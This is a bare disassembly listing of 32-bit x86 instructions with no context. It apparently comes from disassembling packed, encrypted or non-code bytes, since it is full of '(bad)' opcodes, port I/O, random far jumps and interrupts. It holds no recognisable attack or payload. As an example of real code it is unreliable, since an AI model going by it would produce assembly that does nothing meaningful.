  41fd51:	mov    dl,0x6
  41fd53:	xor    edi,edi
  41fd55:	mov    edx,0x4cbb159c
  41fd5a:	pop    ecx
  41fd5b:	cs xchg ebx,eax
  41fd5d:	aaa    
  41fd5e:	das    
  41fd5f:	cwde   
  41fd60:	add    eax,0x61f94fa
  41fd65:	push   edx
  41fd66:	(bad)  
  41fd67:	mov    dl,0x7e
  41fd69:	js     0x41fd02
  41fd6b:	sbb    al,0x16
  41fd6d:	test   BYTE PTR ss:[ebx-0x74],al
  41fd71:	pop    eax
  41fd72:	test   eax,0x46d8605d
  41fd77:	out    0xea,al
  41fd79:	jp     0x41fd24
  41fd7b:	lea    edx,[edi+ebx*4]
  41fd7e:	mov    edx,0x6ef659e
  41fd83:	imul   esp,DWORD PTR [esp+ebp*8],0x70d5028d
  41fd8a:	xor    al,0x93
  41fd8c:	mov    edx,0x45f347ef
  41fd91:	sub    BYTE PTR [esi-0xc03a520],al
  41fd97:	out    dx,al
  41fd98:	push   ebx
  41fd99:	leave  
  41fd9a:	adc    eax,0x831a948c
  41fd9f:	out    dx,al
  41fda0:	inc    esi
  41fda1:	mov    cl,0x5d
  41fda3:	and    dh,BYTE PTR [ebx+0x78]
  41fda6:	int    0x16
  41fda8:	cmc    
  41fda9:	outs   dx,DWORD PTR ds:[esi]
  41fdaa:	(bad)  
  41fdab:	jecxz  0x41fdb8
  41fdad:	mov    BYTE PTR [esp+ecx*2],ah
  41fdb0:	mov    ds:0xfd1f0655,al
  41fdb5:	push   0xa2d83ea1
  41fdba:	das    
  41fdbb:	ror    DWORD PTR [eax+0x981ea53],cl
  41fdc1:	mov    ds:0xe96a1b8,eax
  41fdc6:	or     DWORD PTR [esi+0x1c],edi
  41fdc9:	std    
  41fdca:	sbb    esp,DWORD PTR [edx+0x18ff68ab]
  41fdd0:	sbb    BYTE PTR [eax-0x2],bl
  41fdd3:	clc    
  41fdd4:	jmp    0x41fe04
  41fdd6:	stc    
  41fdd7:	push   ebp
  41fdd8:	idiv   BYTE PTR [esi]
  41fdda:	inc    esp
  41fddb:	out    0x68,al
  41fddd:	dec    esp
  41fdde:	xor    ebp,DWORD PTR [edi+0x41]
  41fde1:	(bad)  
  41fde2:	sub    esi,DWORD PTR [eax+0x4f]
  41fde5:	push   ebp
  41fde6:	out    dx,eax
  41fde7:	sahf   
  41fde8:	test   al,0xcb
  41fdea:	add    BYTE PTR [ebp+0x2f],dh
  41fded:	mov    dl,0xb1
  41fdef:	mov    ds:0x563217fe,eax
  41fdf4:	test   eax,0x9c7250c5
  41fdf9:	repz or al,0x59
  41fdfc:	lods   eax,DWORD PTR ds:[esi]
  41fdfd:	adc    BYTE PTR [eax-0x2ede1f1a],bh
  41fe03:	adc    al,0x9f
  41fe05:	(bad)  
  41fe06:	sbb    ebx,DWORD PTR [esi-0x203641c9]
  41fe0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe0d:	into   
  41fe0e:	rol    DWORD PTR [edi-0x341d82c6],cl
  41fe14:	pop    ecx
  41fe15:	retf   0xa72f
  41fe18:	shr    eax,cl
  41fe1a:	sub    al,0xce
  41fe1c:	aam    0xdf
  41fe1e:	jle    0x41fdc7
  41fe20:	(bad)  
  41fe21:	lock jge 0x41fdf0
  41fe24:	pop    ebx
  41fe25:	cmp    al,0x33
  41fe27:	cmc    
  41fe28:	or     eax,0xd8a33174
  41fe2d:	lahf   
  41fe2e:	inc    esi
  41fe2f:	xlat   BYTE PTR ds:[ebx]
  41fe30:	xor    DWORD PTR [edx+0x658d7b4f],ebx
  41fe36:	loopne 0x41fe12
  41fe38:	sbb    eax,0x6bf46bd4
  41fe3d:	imul   esi,ebx,0x60
  41fe40:	jbe    0x41fdd0
  41fe42:	lock rcr DWORD PTR [ebp-0x1765988b],0x34
  41fe4a:	dec    eax
  41fe4b:	and    al,0xbb
  41fe4d:	ret    0xa8a6
  41fe50:	test   DWORD PTR ds:0xcffea0f,edx
  41fe56:	mov    esp,0x289dd219
  41fe5b:	aas    
  41fe5c:	and    eax,0x64c87c35
  41fe61:	stos   BYTE PTR es:[edi],al
  41fe62:	xor    ebp,ecx
  41fe64:	sbb    al,BYTE PTR [edi]
  41fe66:	in     eax,dx
  41fe67:	les    esp,FWORD PTR [ecx+edi*8]
  41fe6a:	sub    BYTE PTR [edi-0x63c328c2],dl
  41fe70:	push   0xffffff82
  41fe72:	(bad)  [ecx+0x36f3adcc]
  41fe78:	jno    0x41fea0
  41fe7a:	xchg   BYTE PTR [ebx],dl
  41fe7c:	test   al,0x80
  41fe7e:	pusha  
  41fe7f:	mov    ds:0xefe1c604,al
  41fe84:	clc    
  41fe85:	dec    edi
  41fe86:	mov    ds:0x16eadd6f,al
  41fe8b:	ja     0x41fe64
  41fe8d:	ds nop
  41fe8f:	dec    ecx
  41fe90:	enter  0x4d29,0xe9
  41fe94:	jmp    0x77d:0x22b69e1e
  41fe9b:	sub    BYTE PTR [eax+eiz*4-0x3],ah
  41fe9f:	mov    ah,0x1
  41fea1:	in     eax,dx
  41fea2:	div    BYTE PTR [eax-0x324b4970]
  41fea8:	fwait
  41fea9:	cmp    eax,0x2d839849
  41feae:	xor    ah,BYTE PTR [ecx-0xc467eab]
  41feb4:	sar    DWORD PTR [esi+esi*8],0xb0
  41feb8:	je     0x41fefc
  41feba:	aaa    
  41febb:	xchg   esp,eax
  41febc:	add    eax,0x873e69ee
  41fec1:	inc    edi
  41fec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fec3:	xchg   ebp,eax
  41fec4:	jnp    0x41fed6
  41fec6:	jbe    0x41ff28
  41fec8:	out    0x53,eax
  41feca:	mov    edx,0x234539ba
  41fecf:	sub    eax,0xfcc58292
  41fed4:	inc    esp
  41fed5:	stos   DWORD PTR es:[edi],eax
  41fed6:	(bad)  [ebx+0x1b]
  41fed9:	pop    ecx
  41feda:	and    DWORD PTR ds:0x5283cffd,0x266015d4
  41fee4:	dec    esp
  41fee5:	test   al,0x45
  41fee7:	xchg   edi,eax
  41fee8:	push   es
  41fee9:	je     0x41ff24
  41feeb:	enter  0x37b1,0xd9
  41feef:	cli    
  41fef0:	jns    0x41fe96
  41fef2:	out    dx,al
  41fef3:	iret   
  41fef4:	mov    al,0x7f
  41fef6:	push   esi
  41fef7:	mov    WORD PTR [esp+ecx*4],cs
  41fefa:	jae    0x41ff64
  41fefc:	cmp    DWORD PTR [edx+0x7d],ebx
  41feff:	push   ds
  41ff00:	adc    dl,dh
  41ff02:	(bad)  [edi]
  41ff04:	add    eax,eax
  41ff06:	into   
  41ff07:	sub    cl,BYTE PTR [eax+0x7ee23680]
  41ff0d:	inc    ecx
  41ff0e:	sub    eax,0xaf131a9c
  41ff13:	shl    BYTE PTR [ebx+0x3d],1
  41ff16:	iret   
  41ff17:	das    
  41ff18:	and    eax,0xba474574
  41ff1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff1e:	xor    al,0xb2
  41ff20:	add    eax,0xcda25da1
  41ff25:	mov    ecx,0x28c071d8
  41ff2a:	pop    es
  41ff2b:	int    0x4c
  41ff2d:	sbb    eax,0xcf47b0c3
  41ff32:	push   es
  41ff33:	sti    
  41ff34:	mov    ds:0xf52f731c,eax
  41ff39:	mov    ecx,0x55c06dd0
  41ff3e:	pop    eax
  41ff3f:	xchg   BYTE PTR [esi-0x63559156],cl
  41ff45:	cmp    al,0xe8
  41ff47:	ret    0x7685
  41ff4a:	sub    BYTE PTR [eax+ecx*4],ah
  41ff4d:	outs   dx,DWORD PTR ds:[esi]
  41ff4e:	lds    ebp,FWORD PTR [eax+0x781d2d74]
  41ff54:	adc    ch,bh
  41ff56:	xchg   esi,eax
  41ff57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff58:	xchg   esi,eax
  41ff59:	es xchg esp,eax
  41ff5b:	clc    
  41ff5c:	mov    esi,0x31006a54
  41ff61:	in     al,dx
  41ff62:	loope  0x41ffb6
  41ff64:	retf   0xe668
  41ff67:	dec    edx
  41ff68:	mov    ch,0x77
  41ff6a:	fwait
  41ff6b:	gs push ss
  41ff6d:	mov    bl,0x51
  41ff6f:	xchg   ecx,eax
  41ff70:	fwait
  41ff71:	xchg   esp,eax
  41ff72:	add    BYTE PTR [ebx-0x11],bh
  41ff75:	rcl    BYTE PTR ds:0x6fcacee4,cl
  41ff7b:	push   eax
  41ff7c:	fsubr  QWORD PTR [ebx-0x49]
  41ff7f:	pop    ds
  41ff80:	or     DWORD PTR [esi+0x65],0x33
  41ff84:	push   eax
  41ff85:	mov    al,0x4d
  41ff87:	xchg   edx,eax
  41ff88:	adc    BYTE PTR [ecx+0x4233a943],0xb6
  41ff8f:	jmp    0x2016:0x25d90e92
  41ff96:	loopne 0x41ffd4
  41ff98:	cmp    al,0x80
  41ff9a:	out    0x1b,al
  41ff9c:	int3   
  41ff9d:	pop    esi
  41ff9e:	cmp    edi,DWORD PTR [edi-0x19c508b0]
  41ffa4:	ins    DWORD PTR es:[edi],dx
  41ffa5:	into   
  41ffa6:	mov    ebx,0x7e5dd439
  41ffab:	in     al,0x46
  41ffad:	xchg   ecx,eax
  41ffae:	adc    DWORD PTR [ecx],ebp
  41ffb0:	arpl   WORD PTR [edi],ax
  41ffb2:	xchg   ebp,eax
  41ffb3:	xchg   bh,dh
  41ffb5:	inc    edx
  41ffb6:	loop   0x41ff8f
  41ffb8:	adc    BYTE PTR [ebx+0x74],bl
  41ffbb:	sub    BYTE PTR [eax+0x64df171a],dl
  41ffc1:	or     BYTE PTR [esi-0x45680bf8],bh
  41ffc7:	lods   eax,DWORD PTR ds:[esi]
  41ffc8:	out    dx,eax
  41ffc9:	sub    ah,dh
  41ffcb:	lds    edi,FWORD PTR [edx+0x5f]
  41ffce:	call   0xd6685aab
  41ffd3:	adc    cl,BYTE PTR [edi-0x39]
  41ffd6:	or     ebx,esp
  41ffd8:	xor    DWORD PTR [ebp-0x2d],eax
  41ffdb:	sub    ebx,DWORD PTR [eax-0x5a]
  41ffde:	jns    0x420057
  41ffe0:	icebp  
  41ffe1:	les    ebp,FWORD PTR [edx]
  41ffe3:	adc    DWORD PTR [eax+0x6b],0x8eb9509a
  41ffea:	push   ecx
  41ffeb:	fist   DWORD PTR [eax]
  41ffed:	lahf   
  41ffee:	mov    bh,0x73
  41fff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fff1:	or     DWORD PTR [esi+0x6a0477ed],edi
  41fff7:	pop    ds
  41fff8:	mov    ecx,0x710161ac
  41fffd:	daa    
  41fffe:	pop    eax
  41ffff:	pop    ebx
  420000:	iret   
  420001:	xlat   BYTE PTR ds:[ebx]
  420002:	adc    esi,DWORD PTR [esi]
  420004:	mov    ecx,0xe6380f8
  420009:	rcr    DWORD PTR [ebx+0x5d],1
  42000c:	std    
  42000d:	add    bl,BYTE PTR [eax+0x6c]
  420010:	test   BYTE PTR [eax-0x6eb20bd9],dl
  420016:	sbb    BYTE PTR [edi+0x22670fd],ah
  42001c:	adc    al,0x60
  42001e:	mov    esp,0x24f7126d
  420023:	loop   0x41fff7
  420025:	mov    dl,0xae
  420027:	jecxz  0x41ffcd
  420029:	jp     0x4200a4
  42002b:	call   0xaa85ba19
  420030:	jns    0x420006
  420032:	ror    DWORD PTR [ebp+0x1b229afd],0xd3
  420039:	in     eax,0x67
  42003b:	pop    eax
  42003c:	lea    ebp,[ebp+0x69]
  42003f:	leave  
  420040:	xlat   BYTE PTR ds:[ebx]
  420041:	pop    edi
  420042:	je     0x420051
  420044:	or     al,BYTE PTR [esi]
  420046:	add    ecx,0x90b64c9c
  42004c:	out    dx,al
  42004d:	fcomip st,st(6)
  42004f:	cld    
  420050:	mov    cl,BYTE PTR [ebp-0x38]
  420053:	js     0x42005e
  420055:	sub    al,0x91
  420057:	rol    BYTE PTR [eax+0x4a],1
  42005a:	int    0xf7
  42005c:	(bad)
  42005f:	aad    0xab
  420061:	adc    al,0xeb
  420063:	lods   al,BYTE PTR ds:[esi]
  420064:	es xor eax,0x56cf45c
  42006a:	add    edi,ebx
  42006c:	xor    DWORD PTR ds:0x61fcdcdf,ecx
  420072:	push   es
  420073:	into   
  420074:	lods   al,BYTE PTR ds:[esi]
  420075:	call   0x66cf:0x431eb897
  42007c:	xor    BYTE PTR [ecx+0x3251fd40],ah
  420082:	into   
  420083:	mov    eax,0x4a69ec7c
  420088:	sahf   
  420089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42008a:	shl    DWORD PTR [edx],0x9a
  42008d:	ds push es
  42008f:	std    
  420090:	push   ebp
  420091:	mov    BYTE PTR [esi-0x8],0xc2
  420095:	int    0x3d
  420097:	cld    
  420098:	mov    al,0x5e
  42009a:	(bad)  
  42009b:	lods   eax,DWORD PTR ds:[esi]
  42009c:	scas   al,BYTE PTR es:[edi]
  42009d:	popa   
  42009e:	aam    0x83
  4200a0:	xchg   BYTE PTR [ecx+0x3b],bl
  4200a3:	cmp    dh,0x32
  4200a6:	jne    0x42008c
  4200a8:	imul   esp,DWORD PTR ds:0x9e3fd2e6,0x4e
  4200af:	xor    ebp,esi
  4200b1:	jb     0x4200da
  4200b3:	or     eax,0xe3db0f6c
  4200b8:	xchg   BYTE PTR [ebx+0x4c70f6b6],dl
  4200be:	or     DWORD PTR [ecx],0x501f0827
  4200c4:	ja     0x4200fa
  4200c6:	add    eax,0xc77d2ea5
  4200cb:	pop    ebx
  4200cc:	enter  0xe516,0x71
  4200d0:	std    
  4200d1:	push   ss
  4200d2:	retf   0x33c
  4200d5:	inc    edi
  4200d6:	iret   
  4200d7:	mov    DWORD PTR [esi],esi
  4200d9:	call   0x869f:0xee27a1ec
  4200e0:	cld    
  4200e1:	scas   eax,DWORD PTR es:[di]
  4200e3:	cld    
  4200e4:	add    eax,0x6c7b8d9e
  4200e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200ea:	dec    edx
  4200eb:	inc    esp
  4200ec:	int    0x1b
  4200ee:	jmp    0xda83:0x2cd7e0a4
  4200f5:	call   0xeace6d7b
  4200fa:	into   
  4200fb:	leave  
  4200fc:	ds xchg ebp,eax
  4200fe:	dec    esp
  4200ff:	jne    0x4200ac
  420101:	cmp    ebx,ebp
  420103:	jmp    0xd9e8ee43
  420108:	scas   eax,DWORD PTR es:[edi]
  420109:	jl     0x420113
  42010b:	mov    bh,0xc6
  42010d:	push   eax
  42010e:	adc    BYTE PTR [ebp+0x2ae50735],bl
  420114:	std    
  420115:	inc    ecx
  420116:	jge    0x42017b
  420118:	into   
  420119:	sub    eax,0xf3980da2
  42011e:	xchg   esi,eax
  42011f:	push   esp
  420120:	sub    ebp,edx
  420122:	out    0x62,al
  420124:	jge    0x420128
  420126:	data16 sti 
  420128:	jle    0x420127
  42012a:	adc    ah,BYTE PTR [eax+0x197432d2]
  420130:	mov    esi,0xe73bf446
  420135:	push   ss
  420136:	mov    edi,0xeb47b3b0
  42013b:	push   eax
  42013c:	dec    edx
  42013d:	ret    0xc45b
  420140:	fs jmp 0x1036:0xdd16718b
  420148:	ins    BYTE PTR es:[edi],dx
  420149:	jo     0x4201a5
  42014b:	mul    BYTE PTR [eax]
  42014d:	enter  0x86a2,0x65
  420151:	mov    esp,0xbf4155ec
  420156:	stos   BYTE PTR es:[edi],al
  420157:	leave  
  420158:	sub    esp,DWORD PTR [edx]
  42015a:	stos   BYTE PTR es:[edi],al
  42015b:	sub    ebx,DWORD PTR [edx+0x369b02cf]
  420161:	retf   0xfbc2
  420164:	inc    ecx
  420165:	mov    bl,BYTE PTR es:[ecx-0x7becfbb3]
  42016c:	add    al,0x52
  42016e:	test   eax,0x6208543c
  420173:	jmp    0x7d121b69
  420178:	push   edx
  420179:	cli    
  42017a:	jno    0x420167
  42017c:	arpl   WORD PTR [ecx-0x33],cx
  42017f:	mov    al,0x76
  420181:	xchg   esi,eax
  420182:	xlat   BYTE PTR ds:[ebx]
  420183:	jecxz  0x420180
  420185:	xor    bl,bh
  420187:	les    ebp,FWORD PTR ds:0x8b5ffa23
  42018d:	sbb    edx,DWORD PTR [ebx]
  42018f:	sub    BYTE PTR [ebp+0x66539bc0],0x40
  420196:	into   
  420197:	outs   dx,BYTE PTR ds:[esi]
  420198:	sti    
  420199:	mov    ecx,0xf939716d
  42019e:	mov    ds:0xedc49b8,eax
  4201a3:	int    0x48
  4201a5:	sub    al,0x14
  4201a7:	xor    eax,0xb41eb9b7
  4201ac:	nop
  4201ad:	push   ecx
  4201ae:	add    dl,BYTE PTR [ebp-0x7e]
  4201b1:	cli    
  4201b2:	stc    
  4201b3:	add    al,0xe0
  4201b5:	adc    eax,0x351cfad6
  4201bb:	pop    ds
  4201bc:	popf   
  4201bd:	nop
  4201be:	loopne 0x420175
  4201c0:	mov    cl,0x68
  4201c2:	test   DWORD PTR [ebx],edx
  4201c4:	outs   dx,DWORD PTR ds:[esi]
  4201c5:	out    dx,al
  4201c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201c7:	jne    0x42014f
  4201c9:	xor    DWORD PTR [ebx],esp
  4201cb:	cdq    
  4201cc:	mov    esp,0x43c9fd22
  4201d1:	or     al,0x10
  4201d3:	int    0x3c
  4201d5:	adc    DWORD PTR [esi+0x7b25e89a],edx
  4201db:	ja     0x420192
  4201dd:	push   ebp
  4201de:	inc    edx
  4201df:	fmul   DWORD PTR [ebx+0x39]
  4201e2:	push   0x313b04de
  4201e7:	dec    esi
  4201e8:	jmp    0x8f1c:0xadf9f399
  4201ef:	nop
  4201f0:	mov    al,ds:0xc4d2206f
  4201f5:	and    ebp,DWORD PTR [ebp+0x1af8655f]
  4201fb:	inc    eax
  4201fc:	jmp    0xb205:0x67d6b4f
  420203:	mov    eax,ds:0x3269b772
  420208:	int3   
  420209:	loop   0x42025b
  42020b:	out    dx,eax
  42020c:	out    dx,eax
  42020d:	das    
  42020e:	clc    
  42020f:	inc    eax
  420210:	and    DWORD PTR [edi+esi*4],0x846c6ac
  420217:	mov    ecx,0x4af3eabd
  42021c:	jg     0x420292
  42021e:	div    DWORD PTR [eax+0x1f]
  420221:	xlat   BYTE PTR ds:[ebx]
  420222:	cs ffreep st(5)
  420225:	lea    edx,[edi-0x72]
  420228:	das    
  420229:	es jmp 0x4201e9
  42022c:	(bad)
  42022f:	dec    esp
  420230:	ret    0x20ac
  420233:	xor    al,0x74
  420235:	mov    ds:0x498e9967,al
  42023a:	xchg   esi,eax
  42023b:	scas   al,BYTE PTR es:[edi]
  42023c:	mov    esi,esp
  42023e:	pop    ds
  42023f:	dec    ebx
  420240:	scas   eax,DWORD PTR es:[edi]
  420241:	inc    eax
  420242:	jmp    0xb753:0x999ac9f3
  420249:	add    eax,0xdd7a2632
  42024e:	mov    ds:0x658cf5a5,eax
  420253:	push   eax
  420254:	mov    eax,0x48d9823a
  420259:	lahf   
  42025a:	xchg   ebx,eax
  42025b:	clc    
  42025c:	xchg   ecx,eax
  42025d:	call   0x5ff2:0x54fbf92d
  420264:	imul   si,WORD PTR [ebx],0x1264
  420269:	jg     0x4202e1
  42026b:	add    DWORD PTR [eax+0x66],edi
  42026e:	push   esi
  42026f:	cdq    
  420270:	imul   eax,DWORD PTR [ebx+0x61],0x77
  420274:	jle    0x420234
  420276:	scas   al,BYTE PTR es:[edi]
  420277:	fstp   st(5)
  420279:	mov    esp,0x4af6b22e
  42027e:	mov    edi,es
  420280:	and    edx,0x50cd367d
  420286:	out    0x26,eax
  420288:	scas   eax,DWORD PTR es:[edi]
  420289:	cmp    BYTE PTR [esi],0xc7
  42028c:	(bad)  
  42028d:	bnd ret 0x4730
  420291:	sub    DWORD PTR [edi],ebx
  420293:	(bad)  [edx+esi*2-0x12]
  420297:	je     0x4202c3
  420299:	push   ds
  42029a:	add    cl,BYTE PTR [ecx-0x5a]
  42029d:	add    DWORD PTR ds:[ebx-0x27],0x62
  4202a2:	mov    ecx,0x17655d1d
  4202a7:	pusha  
  4202a8:	sbb    al,0x2e
  4202aa:	sbb    eax,DWORD PTR [ecx+0x6d0a9e2e]
  4202b0:	pop    esp
  4202b1:	jne    0x420241
  4202b3:	xor    esp,esp
  4202b5:	pusha  
  4202b6:	push   edi
  4202b7:	jle    0x420307
  4202b9:	and    eax,0xf9c10bc1
  4202be:	cmp    ch,bh
  4202c0:	inc    esp
  4202c1:	mov    edx,DWORD PTR [edx-0x16]
  4202c4:	loop   0x42024a
  4202c6:	mov    eax,ds:0x1c173998
  4202cb:	adc    edx,esi
  4202cd:	js     0x42026b
  4202cf:	adc    al,BYTE PTR [ebx+edx*1]
  4202d2:	push   edx
  4202d3:	pop    ds
  4202d4:	bound  edi,QWORD PTR [esi+esi*4-0x29079f19]
  4202db:	cmp    BYTE PTR [eax-0x549d87a6],al
  4202e1:	ds cmc 
  4202e3:	xchg   ebx,eax
  4202e4:	aam    0xf6
  4202e6:	pushf  
  4202e7:	jg     0x420325
  4202e9:	add    edi,DWORD PTR [ebx+0x0]
  4202ec:	jp     0x4202f5
  4202ee:	jecxz  0x420274
  4202f0:	fisub  WORD PTR [esi+0xbf40c30]
  4202f6:	sbb    dl,BYTE PTR [eax]
  4202f8:	cld    
  4202f9:	mov    esp,0x61fe0b52
  4202fe:	push   ds
  4202ff:	stos   DWORD PTR es:[edi],eax
  420300:	int3   
  420301:	test   al,0x6f
  420303:	ret    0xdb77
  420306:	(bad)  [ebx-0x6def26]
  42030c:	inc    ecx
  42030d:	int3   
  42030e:	mov    edx,0xfd362342
  420313:	sub    BYTE PTR [ebp+0x29],al
  420316:	add    al,0x77
  420318:	imul   edi,esp,0xffffffc9
  42031b:	and    dh,BYTE PTR [ebp-0x6bd4deb2]
  420321:	not    DWORD PTR [edi+eax*2]
  420324:	add    edi,eax
  420326:	push   es
  420327:	pop    esp
  420328:	mov    esi,DWORD PTR [eax-0x1b]
  42032b:	(bad)  
  42032c:	lods   al,BYTE PTR ds:[esi]
  42032d:	jbe    0x42031d
  42032f:	jmp    0x16281f92
  420334:	add    ch,BYTE PTR [ebp+0x2c69d533]
  42033a:	mov    dl,0x45
  42033c:	mov    fs,WORD PTR [ebx]
  42033e:	inc    esi
  42033f:	loopne 0x420330
  420341:	in     al,dx
  420342:	lahf   
  420343:	pop    edi
  420344:	mov    dh,0x7b
  420346:	mov    eax,0xb8898965
  42034b:	int3   
  42034c:	cmp    ebx,DWORD PTR [esi]
  42034e:	lods   eax,DWORD PTR ds:[esi]
  42034f:	test   BYTE PTR [edx-0x515021f9],dh
  420355:	dec    ecx
  420356:	and    ch,ch
  420358:	lock pop ebp
  42035a:	mov    ah,0x7a
  42035c:	ds inc eax
  42035e:	push   eax
  42035f:	enter  0x7b1a,0x91
  420363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420364:	sub    BYTE PTR [ebx+ebx*4+0x19],ch
  420368:	jmp    0x10bd93a1
  42036d:	iret   
  42036e:	dec    edi
  42036f:	enter  0xfe2b,0x58
  420373:	adc    eax,0xb5ecb6e6
  420378:	test   al,0x1f
  42037a:	icebp  
  42037b:	in     al,0xcf
  42037d:	xchg   edi,eax
  42037e:	outs   dx,DWORD PTR ds:[esi]
  42037f:	push   edi
  420380:	xor    eax,0x7e30e100
  420385:	push   esp
  420386:	shld   DWORD PTR [esi-0x7],ebx,0x89
  42038b:	stos   BYTE PTR es:[edi],al
  42038c:	jmp    0x42031b
  42038e:	aaa    
  42038f:	mov    dh,0x2d
  420391:	je     0x42038b
  420393:	sbb    cl,dh
  420395:	popa   
  420396:	mov    edx,0x4e8c3a1e
  42039b:	adc    esi,DWORD PTR [esp+edi*1-0x2cdd8817]
  4203a2:	jo     0x4203d3
  4203a4:	push   0x15e102c7
  4203a9:	cld    
  4203aa:	xor    DWORD PTR [ebx-0x1d],0xcb941b8d
  4203b1:	mov    ch,0xd7
  4203b3:	pop    ecx
  4203b5:	push   0x7
  4203b7:	jmp    0xec910eda
  4203bc:	mov    eax,0xd07855fa
  4203c1:	mov    ch,0x80
  4203c3:	or     dh,BYTE PTR [ecx]
  4203c5:	adc    DWORD PTR [ecx+0x70],0x16
  4203c9:	cs adc al,0x82
  4203cc:	or     ebx,ecx
  4203ce:	or     dl,BYTE PTR [eax+0x48]
  4203d1:	jne    0x420401
  4203d3:	scas   al,BYTE PTR es:[edi]
  4203d4:	sbb    esi,eax
  4203d6:	sbb    eax,0xe07cf638
  4203db:	mov    dl,0x45
  4203dd:	leave  
  4203de:	(bad)  
  4203df:	fwait
  4203e0:	add    eax,0xc4102f04
  4203e5:	in     al,dx
  4203e6:	pop    ebp
  4203e7:	ja     0x4203a8
  4203e9:	jmp    0x79af:0x5e8ce1d5
  4203f0:	mov    cl,0x94
  4203f2:	jo     0x420407
  4203f4:	sti    
  4203f5:	cdq    
  4203f6:	cmp    al,0x8
  4203f8:	mov    ds:0xdf54367a,al
  4203fd:	inc    esp
  4203fe:	mov    bh,0x86
  420400:	lock jp 0x4203ac
  420403:	adc    DWORD PTR [ecx+0x5b],0x65
  420407:	push   esi
  420408:	sub    dl,BYTE PTR [esi+ebp*1+0xb]
  42040c:	scas   al,BYTE PTR es:[edi]
  42040d:	(bad)  [ebx+0x75]
  420410:	pop    ss
  420411:	adc    eax,0x9e033799
  420416:	out    0xe2,al
  420418:	pop    es
  420419:	stos   DWORD PTR es:[edi],eax
  42041a:	mov    al,ds:0xda853f7f
  42041f:	sbb    al,0x66
  420421:	fsubr  st(2),st
  420423:	das    
  420424:	adc    DWORD PTR [esi-0x69afb140],0x40dc055c
  42042e:	cmp    ebp,DWORD PTR [eax]
  420430:	mov    ds:0xed1cb0e6,eax
  420435:	enter  0x225,0xf2
  420439:	xchg   DWORD PTR [esi+0x1134f67a],edi
  42043f:	add    DWORD PTR [edi],ebx
  420441:	mov    esi,eax
  420443:	mov    ecx,0xa7735912
  420448:	(bad)  
  420449:	pop    esi
  42044a:	cdq    
  42044b:	cmp    DWORD PTR ds:0xe18dfe72,eax
  420451:	aaa    
  420452:	mov    ecx,0x78f70569
  420457:	mov    ebp,0x2b06d749
  42045c:	mov    al,ds:0xb869312d
  420461:	and    dl,BYTE PTR [eax]
  420463:	sbb    ecx,DWORD PTR [eax-0x6600b8]
  420469:	hlt    
  42046a:	mov    esi,0xd2bf2fcd
  42046f:	sub    ecx,ecx
  420471:	pop    edi
  420472:	fidivr DWORD PTR [ebx]
  420474:	mov    esi,0x986ca767
  420479:	repz fs iret 
  42047c:	test   al,0xc3
  42047f:	fadd   QWORD PTR [edi-0x8b33a0]
  420485:	dec    esp
  420486:	(bad)  
  420487:	mov    ebx,DWORD PTR [ebx]
  420489:	sbb    eax,DWORD PTR [edi]
  42048b:	cdq    
  42048c:	xor    bh,BYTE PTR [esi-0x30]
  42048f:	xchg   esi,eax
  420490:	xlat   BYTE PTR ds:[ebx]
  420491:	mov    ebx,0x666e2b13
  420496:	enter  0x107d,0xe6
  42049a:	rcr    eax,0x22
  42049d:	and    BYTE PTR ds:0x1b717f74,ah
  4204a3:	jnp    0x420455
  4204a5:	lock add eax,0x1e420097
  4204ab:	push   edx
  4204ac:	jbe    0x42047f
  4204ae:	sub    BYTE PTR [eax],cl
  4204b0:	and    BYTE PTR [ebp-0x6915169],bl
  4204b6:	js     0x42052e
  4204b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204b9:	imul   eax,DWORD PTR ds:0xa52b5ecf,0xb884e442
  4204c3:	xchg   al,bl
  4204c5:	call   0x7e23d8fc
  4204ca:	int    0x35
  4204cc:	cmp    eax,ebx
  4204ce:	jp     0x42053c
  4204d0:	pop    eax
  4204d1:	jle    0x4204ea
  4204d3:	(bad)  
  4204d5:	push   cs
  4204d6:	(bad)  
  4204d7:	mov    al,ds:0xa0e388c7
  4204dc:	xor    eax,0x98b5b8a1
  4204e1:	call   0x602f:0xfa27678
  4204e8:	push   eax
  4204e9:	push   ss
  4204ea:	div    DWORD PTR [eax+0x6b3a5a2b]
  4204f0:	test   BYTE PTR [ebp+eax*8-0x1ab22431],cl
  4204f7:	mov    ds:0x8ce8834,eax
  4204fc:	push   0x60
  4204fe:	mov    DWORD PTR [edi+edx*4],0xd11050d2
  420505:	call   0xdbf105b1
  42050a:	fs xchg edi,eax
  42050c:	push   es
  42050d:	dec    bx
  42050f:	daa    
  420510:	push   es
  420511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420512:	fmul   QWORD PTR [ecx-0x69cb1594]
  420518:	xchg   edx,eax
  420519:	mov    al,ds:0x4152d00f
  42051e:	sub    eax,0x13114208
  420523:	adc    edi,ebx
  420525:	or     DWORD PTR [ebx-0x2a],edx
  420528:	dec    eax
  420529:	sar    DWORD PTR [ebx+0x10b22d00],cl
  42052f:	sbb    bh,BYTE PTR [ebp+0xb]
  420532:	jae    0x420533
  420534:	adc    ebp,eax
  420536:	sub    edx,eax
  420538:	outs   dx,DWORD PTR ds:[esi]
  420539:	fwait
  42053a:	mov    al,ds:0xef0e721c
  42053f:	sbb    DWORD PTR [esp+ebp*1+0x46f61ced],eax
  420546:	push   0xe62ea8c6
  42054b:	push   0xffffffe0
  42054d:	mov    al,0x37
  42054f:	retf   0xb05a
  420552:	mov    ds:0xe0d83056,eax
  420557:	and    al,0xa5
  420559:	dec    ebx
  42055a:	in     eax,0x87
  42055c:	lea    esp,[ebx+0x3b]
  42055f:	xor    eax,0x5e98f134
  420564:	idiv   BYTE PTR [ebp-0x49]
  420567:	or     eax,0x875885cc
  42056c:	inc    esi
  42056d:	ins    DWORD PTR es:[edi],dx
  42056e:	xor    ebp,DWORD PTR [ebx-0x4]
  420571:	ja     0x42050e
  420573:	retfw  0xb349
  420577:	or     DWORD PTR [esi],eax
  420579:	sti    
  42057a:	stc    
